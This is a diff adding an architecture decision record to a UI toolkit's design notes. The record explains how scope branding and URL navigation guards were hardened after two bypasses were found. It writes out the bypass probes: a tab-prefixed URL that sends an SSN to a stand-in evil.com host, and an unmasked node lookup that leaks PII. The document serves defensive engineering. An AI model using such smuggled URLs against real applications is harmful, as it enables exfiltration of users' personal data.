@@ -489,3 +489,77 @@ a file is not governance.
 - Bundle count multiplies with personas. State the cost.
 - Who chooses which bundle to serve? That is the host's authorization layer, and it must be named in the docs, not
   assumed.
+
+---
+
+## ADR-010 — The scope is branded; gates split into *primitive* and *wiring*
+
+**Status:** accepted. `atomkit/src/scope.ts`, `spike/governance-gate.mjs`. Gate: **10 held, 2 open**.
+
+### What the CTO caught
+The security engineer closed G2 and G5, and the gate went green: `8 held · 0 OPEN`, exit 0. **That green was false.**
+The CTO reproduced two bypasses in one line each, and both were reproduced again here before anything was changed:
+
+```
+safeNavigate("/<TAB>/evil.com/steal?d=SSN", {allowHosts:["app.example.com"]})   → unchanged
+new URL("/<TAB>/evil.com/steal", "https://app.example.com").href                → https://evil.com/steal
+
+evalExpr("state.node.props.text", buildScope({state:{node: piiNode}}, {canViewPii:false}))
+                                                                                → "SSN 123-45-6789"
+```
+
+The URL parser *removes* tab/LF/CR, so a prefix check on the raw string never sees the control character. And
+`isDocumentShaped` demanded a **numeric** `version`, so a **node** — what a composer's inspector holds by
+definition — was rebuilt field-by-field and its PII survived.
+
+The gate could not catch either, because it probed **one input per check**. A test with no negative control is a
+decoration.
+
+### Decision 1 — enforce, don't request
+`scope.ts` opened with the rule *"no call site may hand a raw object to the evaluator."* That rule lived in a
+comment. A comment is not an enforcement: a renderer that forgets is prevented from nothing.
+
+`buildScope()` now brands its result with `Symbol.for('atomkit.scope')`, non-enumerable. `evalInScope()` and
+`interpolateInScope()` are the only sanctioned entries and **refuse anything unbranded, failing closed** —
+`undefined`, which renders as nothing, exactly as an unresolvable reference already does.
+
+- The brand cannot be forged by a **document**, because a document is JSON, and JSON cannot name a symbol key.
+- It is non-enumerable, so a spread silently loses it — and losing it fails **closed**.
+- It never appears in JSON, in an expression, or in a diff.
+- `evalExpr` remains a pure evaluator and still returns raw PII for a raw scope. That is asserted, not hidden: it
+  is unexported, and governance lives at the **scope boundary** so nothing downstream has to remember to.
+
+### Decision 2 — a gate has two halves
+> A primitive nobody is forced to use is a library, not an invariant.
+
+That is the CTO's objection to the expression evaluator in `0.8.0`, and it applies identically here. So every
+governance gate now asks two questions:
+
+| | question | today |
+|---|---|---|
+| `G2` | the sanctioned entry refuses an unstripped scope | ✅ held |
+| `G2b` | the brand cannot be forged by JSON, nor survive a spread | ✅ held |
+| `G2p` | `buildScope` masks every governed *shape*, not just a document | ✅ held |
+| **`G2w`** | **the renderer evaluates only through `evalInScope`** | ❌ **open** |
+| `G5p` | `safeNavigate` blocks every exfil *class*, and passes legitimate targets | ✅ held |
+| **`G5w`** | **every navigation path routes through `safeNavigate`** | ❌ **open** |
+
+`G2p` probes document, selected node, array, string-version, deep nesting and loop variable. `G5p` probes tab, LF,
+CR, protocol-relative, userinfo spoof, suffix spoof and schemeless host — **and** asserts legitimate targets still
+pass, because a guard that blocks everything also "passes" a one-sided test.
+
+### The deleted gate, justified
+The old `G5` asserted `safeHref` blocks an exfil URL. **It does not, and it should not.** `safeHref` guards an
+*authored* `href` — a link a reader clicks, carrying no state. Restricting those to an allow-list would break
+ordinary outbound links. `safeNavigate` guards `navigate(expr)`, which can carry state to any host. Two different
+questions; the old gate conflated them. Replaced by `G5p` (is the right guard sound?) and `G5w` (is it used?).
+
+### What this does not do
+It does not close G2 or G5. The renderer has **no expression layer**, so nothing is forced through `evalInScope`,
+and there is **no action layer**, so nothing calls `safeNavigate`. Both are now *explicit gates* (`G2w`, `G5w`)
+rather than something a reader has to notice. They close when the AQL 1.0 runtime lands — in the runtime **and**
+the compiler, in one change, with the conformance suite extended. That is the CTO's binding ordering.
+
+`spike/gate-ratchet.mjs` is what CI runs. It refused to let this change land silently: it flagged G2 closing, three
+new gates, and one deleted gate, and demanded each be written down. That is the ratchet working, and it is why
+this ADR exists.
